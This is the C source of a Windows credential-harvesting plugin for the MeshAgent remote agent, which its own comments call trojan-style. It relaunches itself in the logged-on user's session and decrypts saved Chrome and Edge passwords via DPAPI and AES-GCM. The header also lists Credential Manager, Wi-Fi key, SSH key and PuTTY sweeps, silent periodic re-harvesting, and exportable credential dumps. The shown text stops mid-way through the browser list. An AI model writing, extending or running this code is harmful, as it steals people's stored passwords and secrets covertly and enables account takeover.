/* Native Windows credential recovery module for MeshAgent (mcpassrec plugin).
 *
 * "Full password recovery" the way a remote-access trojan does it: a sweep
 * that runs in the interactive user's session and harvests
 *
 *   - Chromium-family browser vaults (Chrome, Edge, Brave, Vivaldi, Opera,
 *     Chromium, Ungoogled Chromium): Login Data SQLite rows, the DPAPI key
 *     from Local State, and AES-256-GCM password decryption.
 *   - Firefox profile logins.json (hostname + username; password best effort).
 *   - Windows Credential Manager (CredEnumerateW; DPAPI-decrypts generic creds).
 *   - Wi-Fi profile passwords (netsh wlan show profile ... key=clear).
 *   - SSH keys (~/.ssh inventory) and PuTTY saved sessions (registry).
 *
 * The agent service normally runs in session 0 (SYSTEM), which cannot see a
 * logged-on user's DPAPI master key or %LOCALAPPDATA% profiles, so - exactly
 * like the reference keylogger - the agent re-launches itself as
 * "MeshService.exe passrecover-worker <pipe>" in the console user's session
 * (CreateProcessAsUser on the WTSQueryUserToken token). The worker performs
 * the sweep and streams a JSONL result back over \\.\pipe\mcpassrec. When the
 * agent already runs in an interactive session the sweep runs in-process.
 *
 * JavaScript API (require('passrecover')):
 *     harvest()                    run a sweep now; returns { ok, added, total, error? }
 *     start({ intervalMinutes })   trojan-style loop: sweep now, then every N
 *                                  minutes (default 360) forever; true
 *     stop()                       stop the periodic loop; true
 *     getState()                   { available, session0, totalCreds, bufferCount,
 *                                    dir, currentFile, lastHarvest, lastError,
 *                                    running, intervalMinutes }
 *     read(maxLines)               array of pending JSON entry strings (0 = all), oldest first
 *     listFiles()                  array of { name, size, mtime } for passrec-* files
 *     readFile(name, offset, maxBytes) { data (base64), size, bytes, offset, done }
 *     export(fmt)                  fmt = 'csv' | 'json' | 'html'; writes a report file, returns { name, size }
 *
 * Recovered entries are kept in an in-memory ring (live view) and appended to
 * a rolling, date-named JSONL report (passrec-YYYY-MM-DD.jsonl) in the agent
 * directory. export() renders the current report as CSV/JSON/HTML so the
 * browser can save it - the trojan-style credential dump.
 */
#include "ILibDuktape_PassRecover.h"
#include "ILibDuktape_Helpers.h"
#include "ILibDuktapeModSearch.h"

#ifdef WIN32

#include <windows.h>
#include <WtsApi32.h>
#include <userenv.h>
#include <sddl.h>
#include <wincrypt.h>
#include <bcrypt.h>
#include <stdio.h>

/* Reduced Windows SDK installs (BuildTools-only) ship a bcrypt.lib that does
 * not export the authenticated-cipher entry points, and a bcrypt.h that does
 * not declare them. Load them dynamically from bcrypt.dll so the module links
 * and runs on any SDK / Windows 8+ machine. */
typedef NTSTATUS (NTAPI *PR_BC_DestroyAlgorithm_fn)(BCRYPT_ALG_HANDLE hAlgorithm);
typedef NTSTATUS (NTAPI *PR_BC_InitAuthMode_fn)(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO *pAuthInfo);
typedef NTSTATUS (NTAPI *PR_BC_InitAuthCipher_fn)(BCRYPT_KEY_HANDLE hKey, BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO *pAuthInfo);
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <time.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#pragma comment(lib, "credui.lib")

#ifndef NT_SUCCESS
#define NT_SUCCESS(s) (((NTSTATUS)(s)) >= 0)
#endif

#ifndef CRYPT_DEFAULT
#define CRYPT_DEFAULT 0x1
#endif

/* Minimal Credential Manager API surface (mcredapi.h is absent from some
 * Windows SDK installs; the declarations below match the SDK header). */
#ifndef ILIB_PR_CREDMAN_DECLARED
#define ILIB_PR_CREDMAN_DECLARED
typedef struct _PR_CREDENTIALW
{
    DWORD    Type;
    LPWSTR   TargetName;
    LPWSTR   Comment;
    FILETIME LastWritten;
    DWORD    CredentialBlobSize;
    LPBYTE   CredentialBlob;
    DWORD    Attribute;
    LPWSTR   TargetAlias;
    LPWSTR   UserName;
    LPWSTR   Provider;
} PR_CREDENTIALW;
typedef PR_CREDENTIALW *LPPR_CREDENTIALW;
#ifndef CRED_FLAGS_USERNAME_TARGET
#define CRED_FLAGS_USERNAME_TARGET 0x00000001
#endif
typedef BOOL (WINAPI *PR_CredEnumerateW_fn)(LPCWSTR lpCredentialFilter, DWORD dwFlags, LPDWORD pdwCredentialCount, LPBYTE *ppCredentials);
#endif

#define PR_RING            2048
#define PR_ENTRY_MAX       2048
#define PR_NAME_MAX        260
#define PR_PATH_MAX        1024
#define PR_ERR_MAX         256
#define PR_PIPE_NAME       L"\\\\.\\pipe\\mcpassrec"
#define PR_PIPE_BUF        (8 * 1024 * 1024)
#define PR_WORKER_TIMEOUT_MS 25000

typedef struct PrEntry
{
    char text[PR_ENTRY_MAX];
} PrEntry;

typedef struct PassRecover
{
    PrEntry ring[PR_RING];
    unsigned long long writeIdx; /* monotonic count of appended entries      */
    unsigned long long readIdx;  /* monotonic count drained by read()        */

    char dir[PR_PATH_MAX];
    char currentFile[PR_NAME_MAX];
    char currentDate[16];
    unsigned long long currentSize;
    FILE *report;

    unsigned long long totalCreds;
    int available;
    int session0;
    time_t lastHarvest;
    unsigned int lastAdded;
    char lastError[PR_ERR_MAX];

    /* Trojan-style periodic harvesting: a thread re-runs the sweep every
     * autoIntervalMin minutes so credentials keep flowing into the report
     * without anyone touching the web UI. */
    HANDLE autoThread;
    HANDLE autoStopEvent;
    unsigned int autoIntervalMin;
    volatile int autoRunning;

    CRITICAL_SECTION cs;
    int inited;
} PassRecover;

static PassRecover g_pr;

/* ------------------------------------------------------------------ utils */

static void PrSetError(PassRecover *pr, const char *fmt, ...)
{
    va_list ap;
    va_start(ap, fmt);
    _vsnprintf_s(pr->lastError, PR_ERR_MAX, _TRUNCATE, fmt, ap);
    va_end(ap);
}

static void PrNowStamp(char *out, size_t outLen)
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    _snprintf_s(out, outLen, _TRUNCATE, "%04d-%02d-%02d %02d:%02d:%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

static void PrNowStampFile(char *out, size_t outLen)
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    _snprintf_s(out, outLen, _TRUNCATE, "%04d%02d%02d-%02d%02d%02d",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
}

static void PrTodayDate(char *out, size_t outLen)
{
    SYSTEMTIME st;
    GetLocalTime(&st);
    _snprintf_s(out, outLen, _TRUNCATE, "%04d-%02d-%02d", st.wYear, st.wMonth, st.wDay);
}

static int PrWideToUtf8(const wchar_t *w, char *out, int outSize)
{
    int n = WideCharToMultiByte(CP_UTF8, 0, w, -1, out, outSize, NULL, NULL);
    if (n <= 0) { if (outSize > 0) { out[0] = 0; } return 0; }
    return n - 1;
}

static int PrUtf8ToWide(const char *s, wchar_t *out, int outSize)
{
    return MultiByteToWideChar(CP_UTF8, 0, s, -1, out, outSize);
}

static int PrGetEnvW(const wchar_t *name, wchar_t *out, int outSize)
{
    return GetEnvironmentVariableW(name, out, outSize) > 0;
}

/* All call sites pass buffers of PR_PATH_MAX wide chars. */
static void PrCombineW(const wchar_t *base, const wchar_t *rel, wchar_t *out)
{
    size_t bl;
    bl = wcslen(base);
    if (bl == 0) { out[0] = 0; return; }
    if (base[bl - 1] == L'\\' || base[bl - 1] == L'/')
    {
        _snwprintf_s(out, PR_PATH_MAX, _TRUNCATE, L"%s%s", base, rel);
    }
    else
    {
        _snwprintf_s(out, PR_PATH_MAX, _TRUNCATE, L"%s\\%s", base, rel);
    }
}

static int PrFileExistsW(const wchar_t *path)
{
    DWORD a = GetFileAttributesW(path);
    return (a != INVALID_FILE_ATTRIBUTES) && !(a & FILE_ATTRIBUTE_DIRECTORY);
}

/* Case-insensitive memmem (MSVC lacks memmem). */
static const unsigned char *PrMemmem(const unsigned char *hay, size_t hayLen, const unsigned char *needle, size_t needleLen)
{
    size_t i;
    if (needleLen == 0 || needleLen > hayLen) { return NULL; }
    for (i = 0; i + needleLen <= hayLen; i++)
    {
        if (hay[i] == needle[0] && memcmp(hay + i, needle, needleLen) == 0) { return hay + i; }
    }
    return NULL;
}

/* Read an entire file into a heap buffer (caller frees). Returns 1 on success. */
static int PrReadFileAllW(const wchar_t *path, unsigned char **out, unsigned long long *outLen)
{
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    unsigned char *buf;
    unsigned long long off = 0;
    if (h == INVALID_HANDLE_VALUE) { return 0; }
    {
        LARGE_INTEGER sz;
        if (GetFileSizeEx(h, &sz) == FALSE || sz.QuadPart < 0) { CloseHandle(h); return 0; }
        buf = (unsigned char*)malloc((size_t)sz.QuadPart + 1);
        if (buf == NULL) { CloseHandle(h); return 0; }
        while (off < (unsigned long long)sz.QuadPart)
        {
            DWORD want = (DWORD)(((unsigned long long)sz.QuadPart - off) > (1 << 20) ? (1 << 20) : ((unsigned long long)sz.QuadPart - off));
            DWORD got = 0;
            if (ReadFile(h, buf + off, want, &got, NULL) == FALSE || got == 0) { free(buf); CloseHandle(h); return 0; }
            off += got;
        }
    }
    CloseHandle(h);
    *out = buf;
    *outLen = off;
    return 1;
}

/* Base64 decode. Returns decoded length or -1. */
static long PrBase64Decode(const char *in, long inLen, unsigned char *out, long outCap)
{
    int t[256];
    int i;
    for (i = 0; i < 256; i++) { t[i] = -1; }
    for (i = 'A'; i <= 'Z'; i++) { t[i] = i - 'A'; }
    for (i = 'a'; i <= 'z'; i++) { t[i] = i - 'a' + 26; }
    for (i = '0'; i <= '9'; i++) { t[i] = i - '0' + 52; }
    t['+'] = 62; t['/'] = 63;
    {
        long o = 0;
        int bits = 0, acc = 0;
        for (i = 0; i < inLen; i++)
        {
            char c = in[i];
            if (c == '=') { break; }
            if (t[(unsigned char)c] < 0) { continue; }
            acc = (acc << 6) | t[(unsigned char)c];
            bits += 6;
            if (bits >= 8)
            {
                bits -= 8;
                if (o < outCap) { out[o++] = (unsigned char)((acc >> bits) & 0xff); }
            }
        }
        return o;
    }
}

/* Base64 encode. Returns length or -1. */
static long PrBase64Encode(const unsigned char *in, long inLen, char *out, long outCap)
{
    static const char tbl[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    long o = 0, i;
    for (i = 0; i + 2 < inLen; i += 3)
    {
        if (o + 4 > outCap) { return -1; }
        out[o++] = tbl[in[i] >> 2];
        out[o++] = tbl[((in[i] & 3) << 4) | (in[i + 1] >> 4)];
        out[o++] = tbl[((in[i + 1] & 0xf) << 2) | (in[i + 2] >> 6)];
        out[o++] = tbl[in[i + 2] & 0x3f];
    }
    if (i < inLen)
    {
        if (o + 4 > outCap) { return -1; }
        out[o++] = tbl[in[i] >> 2];
        if (i + 1 < inLen)
        {
            out[o++] = tbl[((in[i] & 3) << 4) | (in[i + 1] >> 4)];
            out[o++] = tbl[((in[i + 1] & 0xf) << 2)];
        }
        else
        {
            out[o++] = tbl[(in[i] & 3) << 4];
            out[o++] = '=';
        }
        out[o++] = '=';
    }
    if (o < outCap) { out[o] = 0; }
    return o;
}

/* ------------------------------------------------------------------ DPAPI */

static int PrDpapiUnprotect(const unsigned char *in, unsigned long inLen, unsigned char **out, unsigned long *outLen)
{
    DATA_BLOB inBlob = { inLen, (BYTE*)in };
    DATA_BLOB outBlob = { 0, NULL };
    if (CryptUnprotectData(&inBlob, NULL, NULL, NULL, NULL, CRYPT_DEFAULT, &outBlob) == FALSE) { return 0; }
    *out = outBlob.pbData;
    *outLen = outBlob.cbData;
    return 1;
}

/* ------------------------------------------------------------- AES-256-GCM */

static int PrAesGcmDecrypt(const unsigned char *key, unsigned int keyLen,
    const unsigned char *nonce, unsigned int nonceLen,
    const unsigned char *aad, unsigned int aadLen,
    const unsigned char *ct, unsigned int ctLen,
    const unsigned char *tag, unsigned int tagLen,
    unsigned char *out, unsigned int *outLen)
{
    BCRYPT_ALG_HANDLE alg = NULL;
    BCRYPT_KEY_HANDLE kh = NULL;
    BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO info;
    NTSTATUS st;
    HMODULE bc;
    PR_BC_DestroyAlgorithm_fn bcDestroyAlg;
    PR_BC_InitAuthMode_fn bcInitAuthMode;
    PR_BC_InitAuthCipher_fn bcInitAuthCipher;
    int ok = 0;

    bc = GetModuleHandleW(L"bcrypt.dll");
    if (bc == NULL) { bc = LoadLibraryW(L"bcrypt.dll"); }
    bcDestroyAlg = (PR_BC_DestroyAlgorithm_fn)(void*)GetProcAddress(bc, "BCryptDestroyAlgorithm");
    bcInitAuthMode = (PR_BC_InitAuthMode_fn)(void*)GetProcAddress(bc, "BCryptInitAuthMode");
    bcInitAuthCipher = (PR_BC_InitAuthCipher_fn)(void*)GetProcAddress(bc, "BCryptInitializeAuthenticationCipher");
    if (bcDestroyAlg == NULL || bcInitAuthMode == NULL || bcInitAuthCipher == NULL) { return 0; }

    if (BCryptOpenAlgorithmProvider(&alg, BCRYPT_AES_ALGORITHM, NULL, 0) != 0) { return 0; }
    BCryptSetProperty(alg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
    st = BCryptGenerateSymmetricKey(alg, &kh, NULL, 0, (PUCHAR)key, keyLen, 0);
    if (!NT_SUCCESS(st)) { bcDestroyAlg(alg); return 0; }

    bcInitAuthMode(&info);
    info.pbNonce = (PUCHAR)nonce;
    info.cbNonce = nonceLen;
    info.pbAuthData = (PUCHAR)aad;
    info.cbAuthData = aadLen;
    info.pbTag = (PUCHAR)tag;
    info.cbTag = tagLen;

    st = bcInitAuthCipher(kh, &info);
    if (NT_SUCCESS(st))
    {
        unsigned int want = *outLen;
        st = BCryptDecrypt(kh, (PUCHAR)ct, ctLen, &info, NULL, 0, out, want, outLen, 0);
        if (NT_SUCCESS(st)) { ok = 1; }
    }
    BCryptDestroyKey(kh);
    bcDestroyAlg(alg);
    return ok;
}

/* --------------------------------------------------------- minimal SQLite */

static unsigned long long PrSqlite_Varint(const unsigned char **p, const unsigned char *end)
{
    unsigned long long v = 0;
    int i;
    for (i = 0; i < 9 && *p < end; i++)
    {
        unsigned char b = **p;
        (*p)++;
        if (i < 8)
        {
            v = (v << 7) | (b & 0x7f);
            if ((b & 0x80) == 0) { break; }
        }
        else
        {
            v = (v << 8) | b;
        }
    }
    return v;
}

typedef struct PrCol
{
    int type; /* 0 null, 1 int, 2 text, 3 blob, 4 real */
    const unsigned char *data;
    unsigned long long len;
    long long intval;
} PrCol;

static int PrSqlite_DecodeRecord(const unsigned char *rec, size_t recLen, PrCol *cols, int maxCols)
{
    const unsigned char *p = rec, *end = rec + recLen;
    unsigned long long headerLen = PrSqlite_Varint(&p, end);
    const unsigned char *body = rec + headerLen;
    const unsigned char *serEnd = rec + headerLen;
    const unsigned char *q = p;
    unsigned int serials[512];
    unsigned int ncol = 0;
    int i;

    while (q < serEnd && ncol < 512)
    {
        serials[ncol++] = (unsigned int)PrSqlite_Varint(&q, end);
    }
    if (ncol > (unsigned int)maxCols) { ncol = (unsigned int)maxCols; }

    {
        const unsigned char *v = body;
        for (i = 0; i < (int)ncol; i++)
        {
            unsigned int st = serials[i];
            PrCol *c = &cols[i];
            c->data = v; c->len = 0; c->intval = 0;
            if (st == 0)
            {
                c->type = 0;
            }
            else if (st >= 1 && st <= 6)
            {
                int nbytes = (st == 1) ? 1 : (st == 2) ? 2 : (st == 3) ? 3 : (st == 4) ? 4 : (st == 5) ? 6 : 8;
                long long iv = 0;
                int j;
                for (j = 0; j < nbytes && v < end; j++) { iv = (iv << 8) | (long long)(*v++); }
                if (nbytes < 8 && (iv & (1LL << (nbytes * 8 - 1))) != 0) { iv -= (1LL << (nbytes * 8)); }
                c->type = 1; c->intval = iv; c->len = (unsigned long long)nbytes;
            }
            else if (st == 7)
            {
                if (v + 8 <= end) { v += 8; }
                c->type = 4; c->len = 8;
            }
            else if (st == 8)
            {
                c->type = 1; c->intval = 0;
            }
            else if (st == 9)
            {
                c->type = 1; c->intval = 1;
            }
            else if (st >= 12 && ((st % 2) == 0))
            {
                unsigned long long tlen = (st - 12) / 2;
                c->type = 2; c->data = v; c->len = tlen; v += tlen;
            }
            else
            {
                unsigned long long blen = (st >= 13) ? (st - 13) / 2 : 0;
                c->type = 3; c->data = v; c->len = blen; v += blen;
            }
        }
    }
    return (int)ncol;
}

typedef void (*PrSqlite_RowCb)(unsigned long long rowid, const unsigned char *rec, unsigned int recLen, void *ud);

static void PrSqlite_WalkPage(const unsigned char *db, size_t dbLen, unsigned int pageSize, unsigned int page, PrSqlite_RowCb cb, void *ud);

static void PrSqlite_WalkTableBTree(const unsigned char *db, size_t dbLen, unsigned int rootPage, PrSqlite_RowCb cb, void *ud)
{
    unsigned int ps;
    if (dbLen < 100) { return; }
    ps = (unsigned int)((db[16] << 8) | db[17]);
    if (ps == 1) { ps = 65536; }
    PrSqlite_WalkPage(db, dbLen, ps, rootPage, cb, ud);
}

static void PrSqlite_WalkPage(const unsigned char *db, size_t dbLen, unsigned int pageSize, unsigned int page, PrSqlite_RowCb cb, void *ud)
{
    size_t off = (size_t)(page - 1) * (size_t)pageSize;
    if (page < 1 || off + 8 > dbLen) { return; }
    const unsigned char *pg = db + off;
    unsigned int pgLen = (unsigned int)(((dbLen - off) < pageSize) ? (dbLen - off) : pageSize);
    unsigned char type = pg[0];
    unsigned int numCells, cellPtrOff;
    unsigned int i;

    if (type == 0x0D) /* leaf table */
    {
        if (pgLen < 8) { return; }
        numCells = (pg[3] << 8) | pg[4];
        cellPtrOff = 8;
        for (i = 0; i < numCells; i++)
        {
            size_t cpo = cellPtrOff + (size_t)i * 2;
            if (cpo + 2 > pgLen) { break; }
            unsigned int cellOff = (pg[cpo] << 8) | pg[cpo + 1];
            const unsigned char *p = pg + cellOff;
            const unsigned char *end = pg + pgLen;
            if (p + 2 > end) { continue; }
            unsigned long long payloadSize = PrSqlite_Varint(&p, end);
            unsigned long long rowid = PrSqlite_Varint(&p, end);
            if (payloadSize < 0x8000 && (unsigned long long)(end - p) >= payloadSize)
            {
                cb(rowid, p, (unsigned int)payloadSize, ud);
            }
        }
    }
    else if (type == 0x05) /* interior table */
    {
        if (pgLen < 12) { return; }
        unsigned int rightMost = (pg[1] << 24) | (pg[2] << 16) | (pg[3] << 8) | pg[4];
        numCells = (pg[5] << 8) | pg[6];
        cellPtrOff = 12;
        for (i = 0; i < numCells; i++)
        {
            size_t cpo = cellPtrOff + (size_t)i * 2;
            if (cpo + 2 > pgLen) { break; }
            unsigned int cellOff = (pg[cpo] << 8) | pg[cpo + 1];
            const unsigned char *p = pg + cellOff;
            const unsigned char *end = pg + pgLen;
            if (p + 4 > end) { continue; }
            unsigned int child = (p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3];
            PrSqlite_WalkPage(db, dbLen, pageSize, child, cb, ud);
        }
        PrSqlite_WalkPage(db, dbLen, pageSize, rightMost, cb, ud);
    }
}

/* ------------------------------------------------------------ JSON builder */

typedef struct PrJson
{
    char *buf;
    size_t len;
    size_t cap;
} PrJson;

static void PrJson_Init(PrJson *j)
{
    j->cap = 4096;
    j->buf = (char*)malloc(j->cap);
    j->len = 0;
    if (j->buf != NULL) { j->buf[0] = 0; }
}

static void PrJson_Free(PrJson *j)
{
    if (j->buf != NULL) { free(j->buf); }
    j->buf = NULL; j->len = 0; j->cap = 0;
}

static void PrJson_Reserve(PrJson *j, size_t extra)
{
    if (j->buf == NULL) { return; }
    if (j->len + extra + 1 <= j->cap) { return; }
    while (j->len + extra + 1 > j->cap) { j->cap *= 2; }
    j->buf = (char*)realloc(j->buf, j->cap);
}

static void PrJson_AppendRaw(PrJson *j, const char *s, size_t n)
{
    PrJson_Reserve(j, n);
    if (j->buf == NULL) { return; }
    memcpy(j->buf + j->len, s, n);
    j->len += n;
    j->buf[j->len] = 0;
}

static void PrJson_Append(PrJson *j, const char *s)
{
    PrJson_AppendRaw(j, s, strlen(s));
}

static void PrJson_Appendf(PrJson *j, const char *fmt, ...)
{
    char tmp[1024];
    va_list ap;
    va_start(ap, fmt);
    _vsnprintf_s(tmp, sizeof(tmp), _TRUNCATE, fmt, ap);
    va_end(ap);
    PrJson_Append(j, tmp);
}

/* Append a JSON string value (with surrounding quotes, escaped). NULL -> "". */
static void PrJson_AppendStr(PrJson *j, const char *s)
{
    const char *p;
    PrJson_AppendRaw(j, "\"", 1);
    if (s == NULL) { PrJson_AppendRaw(j, "\"", 1); return; }
    for (p = s; *p != 0; p++)
    {
        unsigned char c = (unsigned char)*p;
        switch (c)
        {
        case '"': PrJson_Append(j, "\\\""); break;
        case '\\': PrJson_Append(j, "\\\\"); break;
        case '\n': PrJson_Append(j, "\\n"); break;
        case '\r': PrJson_Append(j, "\\r"); break;
        case '\t': PrJson_Append(j, "\\t"); break;
        case '\b': PrJson_Append(j, "\\b"); break;
        case '\f': PrJson_Append(j, "\\f"); break;
        default:
            if (c < 0x20) { PrJson_Appendf(j, "\\u%04x", c); }
            else { PrJson_AppendRaw(j, (const char*)&c, 1); }
        }
    }
    PrJson_AppendRaw(j, "\"", 1);
}

/* Emit one JSONL entry object. */
static void PrEmitEntry(PrJson *j, const char *source, const char *app, const char *origin, const char *user, const char *password, const char *extra)
{
    char ts[40];
    PrNowStamp(ts, sizeof(ts));
    PrJson_Appendf(j, "{\"ts\":\"%s\",\"source\":\"", ts);
    PrJson_AppendStr(j, source);
    PrJson_Appendf(j, "\",\"app\":\"");
    PrJson_AppendStr(j, app);
    PrJson_Appendf(j, "\",\"origin\":\"");
    PrJson_AppendStr(j, origin);
    PrJson_Appendf(j, "\",\"user\":\"");
    PrJson_AppendStr(j, user);
    PrJson_Appendf(j, "\",\"password\":\"");
    PrJson_AppendStr(j, password);
    PrJson_Appendf(j, "\",\"extra\":\"");
    PrJson_AppendStr(j, extra);
    PrJson_Append(j, "}\n");
}

/* Extract a JSON string field value from a single-line object. Returns 1 if found. */
static int PrGetJsonStr(const char *line, const char *key, char *out, size_t outLen)
{
    char find[64];
    const char *m, *s;
    _snprintf_s(find, sizeof(find), _TRUNCATE, "\"%s\":\"", key);
    m = strstr(line, find);
    if (m == NULL) { if (outLen > 0) { out[0] = 0; } return 0; }
    s = m + strlen(find);
    {
        size_t o = 0;
        while (*s != 0 && *s != '"' && o < outLen - 1)
        {
            if (*s == '\\' && s[1] != 0)
            {
                char c = s[1];
                switch (c)
                {
                case 'n': out[o++] = '\n'; break;
                case 'r': out[o++] = '\r'; break;
                case 't': out[o++] = '\t'; break;
                case 'b': out[o++] = '\b'; break;
                case 'f': out[o++] = '\f'; break;
                case '"': out[o++] = '"'; break;
                case '\\': out[o++] = '\\'; break;
                case '/': out[o++] = '/'; break;
                case 'u':
                    {
                        unsigned int cp = (unsigned int)strtoul(&s[2], NULL, 16);
                        if (cp < 0x80) { out[o++] = (char)cp; } else { out[o++] = '?'; }
                    }
                    s += 4;
                    break;
                default: out[o++] = c; break;
                }
                s += 2;
            }
            else { out[o++] = *s++; }
        }
        out[o] = 0;
    }
    return 1;
}

/* -------------------------------------------------------------- browsers */

/* Read the AES-256 key from a Chromium "Local State" file. Returns 1 on success. */
static int PrChromium_ReadKey(const wchar_t *localStatePath, unsigned char *key, unsigned int *keyLen)
{
    unsigned char *data = NULL;
    unsigned long long len = 0;
    const unsigned char *m;
    const char *start, *end;
    char b64[1024];
    long b64len;
    unsigned char *raw = NULL;
    unsigned long rawLen = 0;
    unsigned char *dec = NULL;
    unsigned long decLen = 0;
    int ok = 0;

    if (!PrReadFileAllW(localStatePath, &data, &len)) { return 0; }
    m = PrMemmem(data, (size_t)len, (const unsigned char*)"encrypted_key", 13);
    if (m != NULL)
    {
        start = strchr((const char*)m + 13, ':');
        if (start != NULL)
        {
            start = strchr(start + 1, '"');
            if (start != NULL)
            {
                end = strchr(start + 1, '"');
                if (end != NULL && (size_t)(end - start - 1) < sizeof(b64) - 1)
                {
                    b64len = (long)(end - start - 1);
                    memcpy(b64, start + 1, (size_t)b64len);
                    b64[b64len] = 0;
                    raw = (unsigned char*)malloc((size_t)b64len + 8);
                    rawLen = (unsigned long)PrBase64Decode(b64, b64len, raw, (long)((size_t)b64len + 8));
                    if (rawLen > 5 + 32 && raw != NULL && memcmp(raw, "DPAPI", 5) == 0)
                    {
                        if (PrDpapiUnprotect(raw + 5, (unsigned long)(rawLen - 5), &dec, &decLen) && decLen == 32)
                        {
                            memcpy(key, dec, 32);
                            *keyLen = 32;
                            ok = 1;
                        }
                    }
                }
            }
        }
    }
    if (raw != NULL) { free(raw); }
    if (dec != NULL) { LocalFree(dec); }
    free(data);
    return ok;
}

struct BrowserCtx
{
    PrJson *out;
    unsigned char key[32];
    unsigned int keyLen;
    const char *browser;
};

static void PrEmitLogin(struct BrowserCtx *bc, const char *origin, const char *user, const unsigned char *pwBlob, unsigned int pwLen)
{
    char pw[512];
    if (pwBlob != NULL && pwLen >= 3 + 12 + 16 && memcmp(pwBlob, "v10", 3) == 0)
    {
        const unsigned char *nonce = pwBlob + 3;
        const unsigned char *tag = pwBlob + pwLen - 16;
        const unsigned char *ct = nonce + 12;
        unsigned int ctLen = (unsigned int)(tag - ct);
        unsigned char plain[512];
        unsigned int plainLen = sizeof(plain);
        if (PrAesGcmDecrypt(bc->key, bc->keyLen, nonce, 12, (const unsigned char*)"v10", 3, ct, ctLen, tag, 16, plain, &plainLen))
        {
            if (plainLen >= sizeof(plain)) { plainLen = sizeof(plain) - 1; }
            memcpy(pw, plain, plainLen);
            pw[plainLen] = 0;
            PrEmitEntry(bc->out, "browser", bc->browser, origin, user, pw, NULL);
        }
        else
        {
            PrEmitEntry(bc->out, "browser", bc->browser, origin, user, "[gcm-decrypt-failed]", NULL);
        }
    }
    else
    {
        PrEmitEntry(bc->out, "browser", bc->browser, origin, user, "[no-password]", NULL);
    }
}

static void PrLoginRowCb(unsigned long long rowid, const unsigned char *rec, unsigned int recLen, void *ud)
{
    struct BrowserCtx *bc = (struct BrowserCtx*)ud;
    PrCol cols[16];
    char origin[512] = "", user[512] = "";
    int n = PrSqlite_DecodeRecord(rec, recLen, cols, 16);
    (void)rowid;
    /* Chrome/Edge "logins" schema (all versions): 0=id, 1=origin URL,
     * 2=username_value, 3=password_value (blob), ... */
    if (n < 4) { return; }
    if (cols[1].type == 2 && cols[1].len < sizeof(origin)) { memcpy(origin, cols[1].data, cols[1].len); origin[cols[1].len] = 0; }
    if (cols[2].type == 2 && cols[2].len < sizeof(user)) { memcpy(user, cols[2].data, cols[2].len); user[cols[2].len] = 0; }
    PrEmitLogin(bc, origin, user, (cols[3].type == 3) ? cols[3].data : NULL, (unsigned int)((cols[3].type == 3) ? cols[3].len : 0));
}

struct MasterCtx
{
    unsigned int rootPage;
    int found;
};

static void PrMasterCb(unsigned long long rowid, const unsigned char *rec, unsigned int recLen, void *ud)
{
    struct MasterCtx *mc = (struct MasterCtx*)ud;
    PrCol cols[8];
    char type[16], name[64];
    int n = PrSqlite_DecodeRecord(rec, recLen, cols, 8);
    (void)rowid;
    if (mc->found || n < 4) { return; }
    if (cols[0].type != 2 || cols[1].type != 2) { return; }
    if (cols[0].len < sizeof(type)) { memcpy(type, cols[0].data, cols[0].len); type[cols[0].len] = 0; } else { return; }
    if (cols[1].len < sizeof(name)) { memcpy(name, cols[1].data, cols[1].len); name[cols[1].len] = 0; } else { return; }
    if (strcmp(type, "table") == 0 && strcmp(name, "logins") == 0)
    {
        if (cols[3].type == 1) { mc->rootPage = (unsigned int)cols[3].intval; mc->found = 1; }
    }
}

static void PrChromium_HarvestLoginData(struct BrowserCtx *bc, const wchar_t *loginDataPath)
{
    unsigned char *db = NULL;
    unsigned long long dbLen = 0;
    struct MasterCtx mc;
    if (!PrReadFileAllW(loginDataPath, &db, &dbLen)) { return; }
    mc.rootPage = 0; mc.found = 0;
    PrSqlite_WalkTableBTree(db, dbLen, 1, PrMasterCb, &mc);
    if (mc.found && mc.rootPage > 0)
    {
        PrSqlite_WalkTableBTree(db, dbLen, mc.rootPage, PrLoginRowCb, bc);
    }
    free(db);
}

static void PrChromium_HarvestRoot(struct BrowserCtx *bc, const wchar_t *root)
{
    wchar_t ls[PR_PATH_MAX], ld[PR_PATH_MAX];
    wchar_t pattern[PR_PATH_MAX];
    WIN32_FIND_DATAW fd;
    HANDLE h;

    PrCombineW(root, L"Local State", ls);
    if (!PrFileExistsW(ls)) { return; }
    if (!PrChromium_ReadKey(ls, bc->key, &bc->keyLen)) { return; }
    /* flat layout (e.g. Opera) */
    PrCombineW(root, L"Login Data", ld);
    if (PrFileExistsW(ld)) { PrChromium_HarvestLoginData(bc, ld); }
    /* profile subdirectories */
    PrCombineW(root, L"*", pattern);
    h = FindFirstFileW(pattern, &fd);
    if (h != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                if (lstrcmpW(fd.cFileName, L".") == 0 || lstrcmpW(fd.cFileName, L"..") == 0) { continue; }
                {
                    wchar_t sub[PR_PATH_MAX];
                    PrCombineW(root, fd.cFileName, sub);
                    PrCombineW(sub, L"Login Data", ld);
                    if (PrFileExistsW(ld)) { PrChromium_HarvestLoginData(bc, ld); }
                }
            }
        } while (FindNextFileW(h, &fd) != FALSE);
        FindClose(h);
    }
}

static void PrBrowsers_Harvest(PrJson *out)
{
    wchar_t localAppData[MAX_PATH];
    static const wchar_t *chromiumRoots[][2] =
    {
        { L"Google\\Chrome\\User Data", L"Chrome" },
        { L"Microsoft\\Edge\\User Data", L"Edge" },
